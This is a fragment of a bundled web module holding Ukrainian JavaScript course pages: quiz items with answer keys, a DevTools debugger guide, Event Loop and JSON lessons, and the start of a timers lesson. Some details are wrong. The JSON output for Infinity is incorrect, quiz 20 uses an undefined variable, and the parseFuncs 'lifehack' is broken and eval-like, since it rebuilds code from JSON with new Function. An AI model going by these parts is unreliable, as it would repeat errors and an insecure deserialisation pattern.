'Josef']\n~~~\n\n→→→ students.length > 4 ◧ students[2] | 4, 'Piter', 'Anna', 'Demid', 'Josef', true, false | Demid →→→\n\n\n◘◘![ico-25 hw] **18**◘◘\n\n~~~js\nvar array = [true, 'Google', NaN, undefined]\n~~~\n\n→→→ array.length > 4 ◧ typeof array[2] | 4, 'string', 'number', 'boolean', 'object', true, false | number →→→\n\n◘◘![ico-25 hw] **19**◘◘\n\n~~~js\nvar array = [true, 'Google', NaN, undefined]\n~~~\n\n→→→ array.length > 4 ◧ typeof array[2] | 4, 'string', 'number', 'boolean', 'object', true, false | number →→→\n\n\n◘◘![ico-25 hw] **20**◘◘\n\n~~~js\nvar alpha = NaN\nvar betta = typeof alpha\n~~~\n\n→→→ b === 'number' | NaN, 'number', 'boolean', true, false | true →→→\n\n\n◘◘![ico-25 hw] **21**◘◘\n\n~~~js\nvar alpha = NaN\nvar betta = typeof alpha === 'string'\n~~~\n\n→→→  !a && !b | NaN, true, false | true →→→\n"},46745:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] Chrome DevTools\n\n[![ico-20 link] Chrome DevTools](external/dev-tools)\n_____________________________________________________________\n\n## ![ico-25 icon] Sources\n\nВідкриваємо [**сторінку**](samples/02)\n\nПереходимо на вкладку **Sources** панелі розробника:\n![](illustrations/lesson-01-1.png)\n\nЗліва бачимо панель навігації:\n@@@@\n![](illustrations/lesson-01-nav-panel.png)\n<br><br>Щоб переглянути код завантаженої сторінки, використовуйте кнопку **~>>~** і відкриваємо **_Pages_**.<br>Тепер ви можете побачити структуру проекту у панелі навігації, а також вибрати файл, який хочете переглянути.<br>Виберіть файл проекту, вміст якого буде відображатися по центру (**index02.js**).\n@@@@\n\nЗ правого боку можна побачити панель самого відладчика:\n@@@@ 1\n![](illustrations/lesson-01-debugger.png)\n@@@@\n_________________________________________________________\n\nУ відладчику можна не тільки працювати з кодом відкритої сторінки.\n\nВи можете створити власний фрагмент коду, який потрібно налагодити.\n\n### ![ico-20 icon] Snippet\n\nВикористовуйте ту саму кнопку **~>>~** у панелі навігації, щоб вибрати **_Snippets_**.\n\n**Snippet** - це фрагмент коду, який довго зберігається в браузері під тим ім'ям, яке ви йому даєте.\n\nЩоб додати новий фрагмент коду, натисніть на кнопку •• + New Snippet •• у панелі навігації ліворуч і введіть назву фрагмента.\n\n![](illustrations/lesson-01-2.png)\n\n@@@@\nДалі ви можете вставити код фрагмента по центру, зберегти зміни (**Ctrl+S**) і запустити код снипета на виконання ► **Ctrl + Enter**.<br><br>^^Якщо зміни не були збережені, то на панелі навігації (ліворуч) змінений фрагмент буде позначений символом ~ * ~.^^\n![](illustrations/lesson-01-snippet.png)\n@@@@\n\n________________________________________________________________________\n\n## ![ico-25 icon] Debugger\n\nНайважливішими розділами налагоджувача, які вам потрібно буде освоїти в першу чергу, є:\n\n| Watch | Call Stack | Scope | Breakpoints |\n\nДля відстеження значень змінних використовується розділ **Watch**.\n@@@@\nУ цьому розділі ви можете додати назви змінних, значення яких ви хочете відстежувати.\n![](illustrations/lesson-01-watch.png)\n@@@@\n\nАле для того, щоб побачити, як ці значення змінюються під час виконання коду, вам потрібно встановити **~Breakpoints~**.\n\n@@@@\nЦе досить легко зробити прямо в коді сніпета.<br>Всі рядки коду пронумеровані, і вам просто потрібно натиснути на номер рядка, щоб встановити точку зупинки.\n![](illustrations/lesson-01-breakpoints.png)\n@@@@\n\nПісля запуску коду фрагмента (► **Ctrl + Enter**) двигун буде виконувати рядок за рядком, поки не досягне наступної (**~Breakpoint~**).\nТут двигун призупинить виконання коду, ви зможете побачити поточні значення змінних, які ви відстежуєте, а потім відновити виконання коду з того місця, де зупинилися.\nВи також можете вносити зміни в код, зберігати зміни (**~Ctrl + S~**) і відновлювати виконання коду. Після відновлення нова версія коду запрацює.\n\n@@@@\n![](icons/debugger-panel.png)\nЩоб відновити виконання коду, скористайтеся кнопкою ![ico-40 debug-button].\n@@@@\n\n![](illustrations/lesson-01-debugger.gif)\n\n_______________________________________________________\n\n![ico20] Можна відслідковувати зміни значень змінних ще й у секції **~Scope~** дебагера:\n• Local - локальні змінні виконуваної функції.\n• Block - змінні контексту виклику виконуваної функції.\n\n![ico-20 warn] Слідкуйте за тим, яка функція зараз запущена в розділі **~Call Stack~**.\n\n_____________________________________________________________________________\n\n### ![ico-25 icon] Event Listener Breakpoints\n\nУ **Chrome DevTools** ви також можете призупинити виконання коду при виникненні подій DOM:\n\n![](illustrations/Chrome-devtools-breakpoints.gif)\n_______________________________________________________\n\n[![ico-70 youtube]](https://youtu.be/PQYG2aJf6uI/)\n"},82542:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] Event Loop\n\n## ![ico-25 icon] Основні поняття\n\n![ico-20 pin] **Процес** — це екземпляр виконуваної програми, на який виділяються системні ресурси (процесорний час і пам'ять).\n\n![ico-20 pin] **Потік** (thread) – це послідовність команд (операторів мови, викликів функцій тощо), які виконуються послідовно одна за одною.\n\nКілька потоків можуть існувати в межах одного процесу і спільно використовувати ресурси (пам'ять).\n\n^^^[Процес і потік]\n^^![ico-20 warn] Кожен процес виконується в окремому адресному просторі.^^\n^^![ico-20 warn] Один процес не може отримати доступ до даних іншого процесу.^^\n^^![ico-20 warn] Кожна програма створює щонайменше один основний потік, який запускає функцію **~main()~**.^^\n^^![ico-20 warn] Програма, що використовує тільки основний потік, є **_однопотоковою_**.^^\n\n^^Багатопотокові мови використовують кілька потоків.^^\n\n^^У багатопроцесорних (багатоядерних) системах кожен процесор (ядро) обслуговує окремий потік, тому потоки дійсно виконуються паралельно (одночасно).^^\n\n^^За наявності лише одного процесора йому доводиться доволі часто перемикатися з одного потоку на інший, щоб створити ілюзію одночасного виконання коду в усіх потоках.^^\n\n^^^\n\n**Стек** — це «швидкий» шматок оперативної пам'яті.\n\n^^^[Stack]\n^^Стек створюється для кожного потоку в багатопотокових мовах.^^\n^^Стек організований за принципом LIFO (останнім прийшов - першим пішов).^^\n^^Розмір стека обмежений.^^\n^^Він задається під час створення потоку.^^\n^^Змінні, що знаходяться в стеку, завжди є локальними (**приватними**).^^\n^^^\n\n**Heap** (\"купа\") — це оперативна пам'ять, в якій зберігаються глобальні змінні.\n\n^^^[Heap]\n^^«Купа» допускає динамічне виділення пам'яті.^^\n^^Доступ до даних, що зберігаються в «купі», забезпечується за допомогою посилань - змінних, значення яких є адресами інших змінних.^^\n^^Тому «купа» працює повільніше, ніж стек.^^\n^^Процесор не контролює «купу» (на відміну від стека), тому для звільнення пам'яті «купи» від непотрібних змінних потрібні «збирачі сміття».^^\n^^^\n\n![ico-25 warn] JS є однопотоковою мовою, тому у нас є лише один стек (**~Call Stack~**).\n\n____________________________________\n\n## ![ico-25 icon] Асинхронність\n\n☼☼☼ Асинхронщина - це панування подій ☼☼☼\n\nОднією з головних властивостей подій є те, що час їх настання непередбачувано.\nТе, що неможливо передбачити, неможливо синхронізувати.\n\nМи не знаємо заздалегідь, коли користувач клацне на кнопці, і чи клацне взагалі.\nВідправляючи запит на сервер, ми не можемо передбачити, скільки мілісекунд нам знадобиться, щоб отримати відповідь від сервера.\n\nДруга властивість більшості подій - результат події недетермінований.\n\n@@@@\nМи не можемо з упевненістю передбачити, чи буде статус відповіді сервера успішним, чи сервер поверне нам код http-помилки.\n![](illustrations/async-fynny-02.gif)\n@@@@\n\nЯкщо ми не можемо керувати подіями, ми можемо дозволити подіям керувати нашим кодом.\n\n## ![ico-25 icon] Event-Driven Programming\n\nАсинхронне програмування полягає у прив'язці функцій до конкретних подій.\nЦе так зване подієво-орієнтоване прораммування (**Event-Driven Programming**).\n\nЗрозуміло, в середовищі (платформі), де буде запускатися ваш додаток, повинен бути механізм, що забезпечує реакцію на події.\nТобто такий механізм повинен забезпечити ваш додаток певним **Event API** (<b>A</b>pplication <b>P</b>rogramme <b>I</b>nterface), сервіси якого дозволять прив'язати ваші функції до певних подій.\nЦей же механізм повинен забезпечити запуск виконання ваших функцій при настанні відповідної події.\n\nУ браузері такий механізм є і називається він **Event Loop**.\n\n**_Event Loop_** - це нескінченний цикл виконання завдань.\n\n[%%%MDN%%%](external/mdn-event-loop)\n\n________________________________________\n\n## ![ico-25 icon] Callback\n\n![ico-20 warn] **У JS виконуються лише функції**.\nДля виконання скрипту спочатку потрібно створити контекст виконання, який буде поміщений у **стек викликів**.\nТому він і називається **стек викликів** (**Call Stack**).\nА що можна викликати? - тільки **функцію**.\n\n@@@@ 1\n![](illustrations/event-loop-01.png)\n@@@@\n\nЄ два способи викликати функцію: це **прямий виклик** та **зворотний виклик**.\n\n**Прямий виклик** - коли функцію викликають на ім'я з того скрипта, який виконується в даний момент.\n\nВиконується - значить, якийсь скрипт уже \"сидить\" у **Call Stack**.\nВін може зробити прямий виклик будь-якої іншої функції.\nАле як він сам потрапив до **Call Stack**?\n\n![ico-20 yes] Першим у Call Stack завжди потрапляє **callback** - _функція зворотного виклику_.\n\n**Callback** - це функція, прив'язана до події, яка потрапить у стек викликів через механізм **Event Loop**.\n\n@@@@ 1\n![](illustrations/event-loop-script.png)\n@@@@\n\n^^Тут скрипт сніппета був \"загорнутий\" в якусь функцію **~anonimous~**, прив'язаний до події \"запустити скрипт ~anonimous~\", після чого ця подія була ініційована.^^\n^^В результаті скрипт **~anonimous~** \"окупував\" **Call Stack** і почав виконуватися.^^\n^^Функція **~anonimous~** стала колбеком і пройшла через **Event Loop**.^^\n^^Тепер **~anonimous~** із стека викликів може здійснювати прямий виклик інших функцій.^^\n----------------------------\n@@@@ 1\n![](illustrations/event-loop-02.png)\n@@@@\n\n^^Функція **~parent~** була викликана зі скрипту **~anonimous~**. Це **прямий виклик**.^^\n----------------------------\n@@@@ 1\n![](illustrations/event-loop-03.png)\n@@@@\n\n^^Функція **~demo~** була викликана зі скрипту **~parent~**. Це **прямий виклик**.^^\n\n^^Як бачимо, всі вони одночасно \" сидять \" у стеку викликів.^^\n^^Зверху завжди знаходиться функція, яка виконується зараз.^^\n^^Функція **~parent~** та функція **~demo~** потрапили у стік викликів на безпосереднє \"запрошення\".^^\n_________________________________________________\n\nАле ми маємо ще одну - анонімну - функцію, яку ми призначили обробником події **~click~** елемента ~document.body~.\nЦя функція є **функцією зворотного виклику** (**callback**).\nЗауважимо, що колбеку ім'я не потрібне. Зазвичай це анонімна функція.\n**Callback** прив'язаний до події.\nЙого може запустити лише механізм **Event Loop**.\nЯкщо ця подія відбудеться, то **~callback~** отримає шанс потрапити до стеку викликів.\nОднак тут доведеться постояти в черзі, тому що подій багато, і коллбеки, пов'язані з ними, утворюють чергу завдань (**task queue**).\n\n@@@@ 1\n![](illustrations/event-loop-04.png)\n@@@@\n\nОтже, ми бачимо, що першим у **Call Stack** завжди потрапляє **~callback~**.\nІ, перебуваючи в стеку викликів, він може викликати інші функції.\nІ кожна функція, що викликана ним, буде одночасно з ним стеку викликів.\n\n@@@@ 1\n![](illustrations/event-loop-05.png)\n@@@@\n\nЦя функція може викликати іншу функцію, контекст виконання якої також з'явиться у стеку викликів.\nТак вони там утворюватимуть \"шаровий пиріг\".\nФункція викликана останньою буде в стеку викликів зверху.\nВона ж перша покине **Call Stack**.\n\n@@@@ 1\n![](illustrations/event-loop-06.png)\n@@@@\n\nОстаннім залишить стек викликів колбек, який і породив усю цю піраміду.\nЗверніть увагу, що кожен колбек займає наш єдиний **Call Stack** до того часу, поки весь його код не буде виконаний до останнього рядка.\nВін може викликати скільки завгодно функцій, які можуть викликати функції.\nПоки вся ця бригада не залишить **Call Stack**, у черзі завдань будуть нудитися інші колбеки.\n\nОтже, різниця між двома способами для функції потрапити у стек викликів:\n\n| **Прямий виклик** | **Зворотній виклик** |\n| Функцію буде запущено на виконання негайно | Колбек потрапить у чергу завдань |\n| Її контекст виконання буде в стеку викликів одночасно з контекстом виконання скрипту, що викликав її | Контекст виконання потрапить у стек викликів, коли той звільниться |\n\n_____________________\n\n@@@@\n![](images/funcs-rule.png)\nЯк бачимо, не тільки модель успадкування, а й асинхронщина в JS тримається на функціях (конструкторах).<br><br>У прототипній моделі успадкування керують функції-**конструктори**, а в асинхронщині – функції-**колбеки**.\n@@@@\n\n☼☼☼ У JS функції реально рулять! ☼☼☼\n\n___________________________________________\n\n## ![ico-25 icon] Event API\n\n@@@@ 3\nЗі зрозумілих причин двигун JS не відстежує події.<br><br>Це робить браузер.\n![](illustrations/js-engine.png)\n^^Браузер - посередник між операційної системою і двигуном, відстежує події клавіатури, миші, системний годинник та ін.^^\n@@@@\n\nБраузер може надсилати запити до мережі та отримувати відповіді.\n\n@@@@\nЯк \"посередник\", браузер пропонує програмний інтерфейс (**API**), який забезпечує JS-додатку доступ до потужних можливостей браузера.<br><br>У браузері є API для роботи з подіями, і його можна назвати **Event API**.\n![](illustrations/web-api.png)\n@@@@\n\nЦей термін охоплює різні інтерфейси та методи, які дозволяють працювати з подіями у веб-додатках (найпоширеніші назви: **Event Handling API** или **Event Listener API**).\n\nНайпростіший приклад браузерного API – метод глобального об'єкта **~setTimeout~**.\nЗ його допомогою ми передаємо браузеру callback і вказуємо, через скільки мілісекунд цей callback повинен потрапити в чергу завдань.\nДалі двигун \"умиває руки\", тому що події відстежує браузер. Таймер встановлений, і браузер вчасно повідомить движку про те, що час минув.\nПісля закінчення часу callback таймера буде поміщений у чергу завдань.\nНе факт, що він потрапить у стек викликів досить швидко.\nУ черзі завдань може бути багато колбеків, і колбеку таймера доведеться чекати на свою чергу.\nЗ черги завдань двигун витягне цей колббек, коли настане його черга і стек викликів буде вільний.\n\n◘◘![ico-20 cap] ** 1**◘◘\n~~~js\nconst start = Date.now()\nconst timer = (time = 0) => setTimeout(() => console.log(Date.now() - start), time)\nlet counter = 0\ndo {\n  timer(500)\n} while (counter++ < 10000)\n~~~\n\n{{{event-loop-01.js}}}\n\nЗауважте, що всі таймери були встановлені на 500 мілісекунд.\nОднак велика кількість колбеків таймерів у черзі завдань призвела до того, що зачіпка запуску чергового колбека зростала в міру просування черги завдань, і зрештою останній колбек увійшов у стек викликів не через 500 мілісекунд, а значно пізніше.\n\n__________________________________________\n\n## ![ico-25 icon] Блокуючі операції\n\n![ico-20 warn] **\"Тяжкі\" таски блокують перемальовування сторінки браузером і роблять сторінку не інтерактивною, тобто. яка не реагує на дії користувача.**\n\"Тяжкий\" таск - це callback, який надовго займе стек викликів і може серйозно затримати виконання інших завдань у черзі, які мали нещастя потрапити туди після нього.\n\n@@@@\n![](illustrations/event-loop-queue.png)\n^^Це схоже на чергу до лікаря в тупій совковій системі.<br>У вас талон на 14:00, уже 15:25 і перед вами в черзі ще 5 осіб.<br>^^\n^^Про що це говорить?<br>Про те, що код напиляно вкрай хреново.^^\n^^<br>Так, совок був хреново напиляним кодом.^^\n@@@@\n\nПишіть код так, щоб стек викликів не був зайнятий надовго.\nІнакше ваша сторінка перестане реагувати на події, тому що колбеки не зможуть потрапити у стек викликів.\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nfunction message (text) {\n  document.body.innerHTML += `<small>${text}</small><br>`\n}\n\nlet start = new Date().getTime()\n\nsetTimeout(() => message(`Timer real time: ${new Date().getTime()-start} ms` ), 0)\n\nfor (var x = 0; x < 1000000000; x++) continue\n\nmessage('Loop \\'for\\' finished')\n~~~\n\nУ цьому прикладі таймер встановлено на затримку 0 сек.\nПодивіться, що вийшло.\n\n{{{Event-Loop-1.js}}}\n\n__________________________________________________________\n\nОголосимо допоміжні функції **~createFigure~** та **~message~**:\n\n◘◘![ico-20 cap] **createFigure**◘◘\n~~~js\nfunction createFigure () {\n  const figure = section\n    .appendChild(document.createElement('div'))\n  return Object.assign(figure, {\n    style: `\n      position: absolute;\n      top: 108px;\n      left: 48px;\n      width: 100px;\n      height: 100px;\n      border-radius: 4px;\n      background: #fa0;\n    `,\n    move () {\n      const { left } = figure.style\n      Object.assign(figure.style, {\n        left: parseInt(left) + 2 + 'px'\n      })\n      Date.now() - start < 5000 && requestAnimationFrame(figure.move)\n    }\n  })\n}\n~~~\n\n◘◘![ico-20 cap] **message**◘◘\n~~~js\nfunction message (text) {\n  document.body\n    .appendChild(document.createElement('p'))\n    .innerHTML = `${Date.now() - start}: ${text}`\n}\n~~~\n\nщоб використовувати їх у наступних прикладах.\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nconst start = Date.now()\n\nconst figure = createFigure()\n\nmessage('Well, you\\'re screwed, kid, now wait for the cycle to complete....')\n\nfigure.move()\n\nsetTimeout(function () {\n  message('<b>Loop started</b>')\n  for (var counter = 0; counter < 10000000000; counter++) continue\n  message('<b>Loop finished</b>')\n}, 0)\n~~~\n\n{{{Event-Loop-3.js}}}\n\nТаск, запущений таймером, займає стек викликів і блокує навіть перемальовування сторінки та виведення повідомлень у консоль.\n\nЗробіть висновок із цього прикладу, і тоді ви зрозумієте, чому ми не можемо створювати модальні вікна.\nБраузер працює у багатопотоковому режимі, і кожен потік має свій стек викликів, тому для нього модальні вікна не проблема.\nАле у нас лише один стек викликів.\n\n____________________________________\n\nВиправимо ситуацію:\n\n◘◘![ico-20 cap] ** 4**◘◘\n~~~js\nconst section = document.body\n\nconst start = Date.now()\n\nconst figure = createFigure()\n\nfigure.move()\n\nconst recurse = (counter => {\n  message('<b>Loop started</b>')\n  return function () {\n    if (counter-- > 0) setTimeout(recurse)\n    else message('<b>Loop finished</b>')\n  }\n})(1000)\n\nrecurse()\n~~~\n\n{{{Event-Loop-4.js}}}\n\nЯк бачите, цикл працює начебто \"у фоновому режимі\", не блокуючи перемальовку екрана та інші операції.\nОднак \"фоновий режим\" у нас неможливий, оскільки JS – однопотоковий, з одним стеком викликів.\nТому ми імітуємо \"багатопоточність\" за допомогою Event Loop.\n\nПізніше ми познайомимося з асинхронними генераторами, які роблять щось подібне.\n______________________________\n\n## ![ico-25 icon] Microtask\n\n☼☼☼ Мікротаски - це нахабні хлопці, які лізуть позачергово ☼☼☼\n\nКолбеки таймерів та обробники подій UI – це таски (tasks).\n\nАле ми маємо ще \"магічні коробки з двома дірками\" - проміси.\nМетод **~then~** промісу теж приймає колбек.\nІ тут у циклі подій відбуваються такі дива:\n\n◘◘![ico-20 cap] ** 5**◘◘\n~~~js\nconst start = Date.now()\n\nfunction message (text) {\n  document.body.innerHTML += `<p>${Date.now() - start}: ${text}</p>`\n}\n\nconst promise = text => new Promise(resolve => resolve(text))\n\nmessage('Start')\n\nsetTimeout(message.bind(null, 'First macrotask'))\nsetTimeout(message.bind(null, 'Second macrotask'))\nsetTimeout(message.bind(null, 'Third macrotask'))\n\npromise('First microtask').then(message)\npromise('Second microtask').then(message)\npromise('Third microtask').then(message)\n~~~\n\n{{{event-loop-microtask.js}}}\n\nКолбеки таймерів потрапляють у **чергу завдань** раніше, ніж колбеки промісів (у таймерів не встановлений час, тобто за умоченням це 0).\nТо чому колбеки промісів потрапляють у **стек викликів** раніше?\n\n![icp-25 yes] Тому що колбеки промісів - це **мікротаски**, і у них своя окрема черга.\n\nКоли стек викликів звільняється, то движок переглядає спочатку чергу мікротасків.\nЯкщо там є колбеки, то вони будуть один за одним відправлятися в стек викликів, поки черга мікротасків не спорожніє.\nТільки тоді движок перейде до черги тасків.\n\nПоки таски сидять і чекають своєї черги, щоб потрапити в Call Stack, спритні мікротаски проскакують туди у них під носом. ![ico-25 smile]\n\n![](illustrations/event-loop-micro-task.gif)\n\n________________________________________\n\nЩойно ми запускаємо скрипт на виконання, ми стартуємо таск.\n\nУ наступному прикладі це виклик функції **~message~**, встановлення таймерів та обробника події ~click~ на _document.body_.\n\nКрім того, ми запускаємо три асинхронні операції, використовуючи **Fetch API** браузера.\n\nМи знаємо, що метод **~fetch()~** повертає проміс.\n\nКолбек, який передається методу **~then()~** промісу, є **мікро-таском**.\n\nТаким чином, як тільки стек викликів звільниться, по черзі будуть виконані всі колбеки, які вже потрапили до черги мікротасків до цього моменту.\nІ лише потім виконуватимуться колбеки із **task queue**.\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nconst start = Date.now()\n\nfunction message (text) {\n  document.body.innerHTML += `<p>${Date.now() - start}: ${text}</p>`\n}\n\nconst timer = ms => setTimeout(() => setTimeout(message.bind(null, `timeout ${ms}`), 0), ms)\n\nfunction getUser () {\n  const since = Math.round(Math.random() * 20000)\n  const index = Math.round(Math.random() * 30)\n  return fetch(`https://api.github.com/users?since=${since}`)\n    .then(response => response.json())\n    .then(users => message(`github user ${since + index}: ${users[index].login}`))\n}\n\nmessage('start')\n\ntimer(1000)\ntimer(500)\ntimer(400)\ntimer(200)\n\ngetUser()\ngetUser()\ngetUser()\n~~~\n\n{{{Event-Loop-6.js}}}\n\nУ цьому прикладі, посилаючи **~fetch()~**-запит на сервер, ми отримуємо проміс, і передаємо методу **~then()~** цього промісу мікротаск, який отримує екземпляр конструктора **Response**, який потрібно розпарсити методом **~json()~**, щоб отримати вміст ~body~.\nМетод **~json()~** знову повертає проміс, методу **~then()~** якого ми передаємо другий мікротаск, який вже отримає вміст відповіді сервера.\nТаким чином, спочатку до черги мікротасків потрапить перший колбек, і тільки після того, як він «відпрацює», до черги мікротасків буде відправлено другий колбек.\n\nЯкби ми відправили методом **~setTimeout()~** тільки один колбек у чергу тасків, то всі колбеки таймерів потрапили б до стека викликів раніше, ніж останній мікротаск потрапив би до черги мікротасків.\n\nЩоб «зрівняти шанси», колбек таймера знову встановлює таймер. Тоді в черзі тасків ситуація буде схожа з чергою мікротасків.\n\n________________________________________________\n"},49045:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] JSON\n\nФормат зберігання JS-об\'єктів у вигляді текстового рядка зручний з точки зору обміну даними з сервером і зберігання даних складної структури.\n\nЦе більш компактна альтернатива формату **XML** (e<b>X</b>tensible ** M**arkup ** L**anguage).\n\n**~JSON~** - є вбудованим нативним об\'єктом (![ico-20 warn] не конструктор).\n\nУ нього всього два методи:\n\n![ico-20 green-ok] **JSON.stringify()**\n![ico-20 green-ok] **JSON.parse()**\n\n~~~~console\n▼ JSON\n    ► parse: ƒ parse()\n    ► stringify: ƒ stringify()\n      Symbol(Symbol.toStringTag): "JSON"\n    ▼ __proto__:\n        ► constructor: ƒ Object()\n        ► hasOwnProperty: ƒ hasOwnProperty()\n        ► isPrototypeOf: ƒ isPrototypeOf()\n        ► propertyIsEnumerable: ƒ propertyIsEnumerable()\n        ► toLocaleString: ƒ toLocaleString()\n        ► toString: ƒ toString()\n        ► valueOf: ƒ valueOf()\n        ► __defineGetter__: ƒ __defineGetter__()\n        ► __defineSetter__: ƒ __defineSetter__()\n        ► __lookupGetter__: ƒ __lookupGetter__()\n        ► __lookupSetter__: ƒ __lookupSetter__()\n        ► get __proto__: ƒ __proto__()\n        ► set __proto__: ƒ __proto__()\n~~~~\n\n_____________________\n\n## ![ico-25 icon] JSON.stringify()\n\nОбов\'язковим аргументом методу є посилання на об\'єкт або масив, а глибина структури даних не обмежена.\n^^Два додаткові формальні параметри є необов\'язковими.^^\nЗначення, що повертається - рядок JSON.\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\n\nJSON.stringify(obj)\n~~~\n\n~~~console\n\'{"name":"sample","type":"figure","color":"green","size":200,"position":[250,250]}\'\n~~~\n\n_____________________\n\n![ico-25 cap] ** 2**\n\nДругий (необов\'язковий) формальний параметр можна використовувати, наприклад, наступним чином:\n\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\n\nJSON.stringify(obj, [\'name\', \'type\', \'color\'])\n~~~\n\n~~~console\n\'{"name":"sample","type":"figure","color":"green"}\'\n~~~\n\n__________________________________\n\n![ico-25 cap] ** 3**\n\nТретій (необов\'язковий) формальний параметр потрібен для форматування результату:\n\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\n\nconsole.log(JSON.stringify(obj, null, 2))\n~~~\n\n~~~console\n{\n  "name": "sample",\n  "type": "figure",\n  "color": "green",\n  "size": 200,\n  "position": [\n    250,\n    250\n  ]\n}\n~~~\n\n### ![ico-20 icon] Обмеження\n\nСправа в тому, що серіалізація об\'єктів не завжди можлива.\nЄ так звані об\'єкти, що не серіалізуються, тому що містять циклічні посилання.\n\nНаприклад, при спробі серіалізувати об\'єкт **window** ми отримаємо _TypeError_:\n\n![ico-25 cap] ** 4**\n\n~~~js\nconsole.log(JSON.stringify(window, null, 2))\n~~~\n\n••![ico-20 error] Uncaught TypeError: Converting circular structure to JSON••\n\n___________________\n\nСпробуємо серіалізувати об\'єкт, що містить такі властивості:\n\n![ico-25 cap] ** 5**\n\n~~~js\nvar user = {\n  name: \'Jack\',\n  age: Infinity,\n  hobby: \'football\',\n  [Symbol.for(\'user-pay\')]: 45,\n  job: undefined,\n  getName () {\n    console.log(this.name)\n  }\n}\n\nconsole.log(JSON.stringify(user, null, 2))\n~~~\n\n~~~console\n{\n  "name": "Jack",\n  "age": 25,\n  "hobby": "football"\n}\n~~~\n\nЯк видно з прикладу, **Infinity**, **undefined** та **Symbol**, а також **методи** об\'єкта відкидаються при серіалізації.\n\n_____________________\n\n## ![ico-25 icon] JSON.parse()\n\nЄдиний обов\'язковий аргумент методу – JSON-рядок.\nЗначення, що повертається - структура даних JS (масив або об\'єкт).\n\n![ico-20 warn] У рядку JSON всі малі значення (включаючи назви властивостей) заключені в **подвійні** лапки.\n![ico-20 warn] Числові та логічні значення, масиви й об\'єкти в лапки не беруться.\n\n![ico-25 cap] ** 6**\n\n~~~js\nvar x = `{\n  "name": "sample",\n  "type": "figure",\n  "attrs": {\n    "color": "green",\n    "size": 200,\n    "position": [250, 250]\n  }\n}`\n\nJSON.parse(x)\n~~~\n\n~~~console\n▼ {name: "sample", type: "figure", attrs: {…}}\n  ▼ attrs:\n        color: "green"\n      ► position: (2) [250, 250]\n        size: 200\n      ► __proto__: Object\n    name: "sample"\n    type: "figure"\n  ► __proto__: Object\n~~~\n\n___________________\n\n## ![ico-25 icon] Глибоке копіювання\n\nВідомо, що масиви та об\'єкти передаються за посиланням.\n\nЯкщо об\'єкт має плоску структуру, отримати точну копію цього об\'єкта можна за допомогою методу **~Object.assign()~**.\n\nОднак якщо властивості об\'єкта є об\'єктами або масивами, **~Object.assign()~** скопіює посилання на ці вкладені об\'єкти.\n\nЯкщо ж виконати спочатку **~JSON.stringify()~**, а потім **~JSON.parse()~**, то в результаті ми отримаємо клони вкладених об\'єктів і масивів, а не посилання на них.\n\n![ico-25 cap] ** 7**\n\n~~~js\nvar obj = {\n  name: \'sample\',\n  type: \'figure\',\n  color: \'green\',\n  size: 200,\n  position: [250, 250]\n}\nvar sample = JSON.parse(JSON.stringify(obj))\n~~~\n\nУ змінній **sample** тепер знаходиться точна копія об\'єкта **obj**, включаючи значення елементів масиву **position**, а не посилання на нього.\n\nПорівняємо результати  **~Object.assign()~** та **~JSON.stringify()~** → **~JSON.parse ()~**\n\n~~~js\nvar test = Object.assign({}, obj)\n~~~\n\nЛогічний вираз:\n\n~~~js\ntest.position === obj.position\n~~~\nповертає ~true~, оскільки значення властивості  **test.position** є посиланням на об\'єкт **obj.position**.\n\nА ось логічний вираз:\n\n~~~js\nsample.position === obj.position\n~~~\n\nповерне ~false~, тому що **sample.position** є іншим об\'єктом, посилання на який не збігається з посиланням на об\'єкт **obj.position**.\n\n------------------------------------\n\n## ![ico-25 icon] Лайфхак\n\nПоставимо завдання серіалізації об\'єкта, включаючи його методи.\n\n![ico-25 cap] ** 8**\n\nДля цього, перш за все, додамо конструктору **~Function~** у prototype метод **toJSON**:\n\n~~~js\nFunction.prototype.toJSON = function () {\n  return this.toString()\n}\n~~~\n\nТепер серіалізація об\'єкта пройде нормально, але метод буде включений в json-рядок як текстовий рядок:\n\n~~~js\nvar user = {\n  name: \'Jack\',\n  age: 25,\n  hobby: \'football\',\n  getName () {\n    console.log(this.name)\n  }\n}\n\nconsole.log(JSON.stringify(user, null, 2))\n~~~\n\n~~~console\n{\n  "name": "Jack",\n  "age": 25,\n  "hobby": "football",\n  "getName": "getName () {\\n    console.log(this.name)\\n  }"\n}\n~~~\n\nЗапишемо оголошення методу трохи інакше:\n\n~~~js\nvar user = {\n  name: \'Jack\',\n  age: 25,\n  hobby: \'football\',\n  getName () {\n    console.log(this.name)\n  }\n}\n~~~\n\nі додамо метод **~parseFuncs~** до об\'єкту **JSON**:\n\n~~~js\nJSON.parseFuncs = function (obj) {\n  const result = this.parse(obj)\n  Object.keys(result)\n    .filter(key => typeof result[key] === \'string\' && !result[key].indexOf(\'function\'))\n    .forEach(key => Object.assign(result, { [key]: new Function(result[key]) }))\n\n  return result\n}\n~~~\n\nТепер ми можем з впевненістю серіалізувати об\'єкт **user**, а потім розібрати результат за допомогою методу **~parseFuncs~**:\n\n~~~js\nconst piter = JSON.parseFuncs(JSON.stringify(user))\n\nconsole.log(piter)\n~~~\n\n~~~console\n{name: \'Jack\', age: 25, hobby: \'football\', getName: ƒ}\n~~~\n'},53873:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Таймери\n\nПершим аргументом таймера обов'язково передається функція зворотного виклику (callback).\nВстановлення таймера повертає числовий ідентифікатор таймера.\n\n## ![ico-30 clock] setTimeout\n\nМетод ~setTimeout~ об'єкта ~window~ приймає два аргументи:\n\n![ico-20 green-ok] функцію зворотного виклику (callback).\n![ico-20 green-ok] тривалість інтервалу затримки (в мілісекундах).\n\nФункція, передана як перший аргумент, буде викликана з інтервалом, зазначеним другим 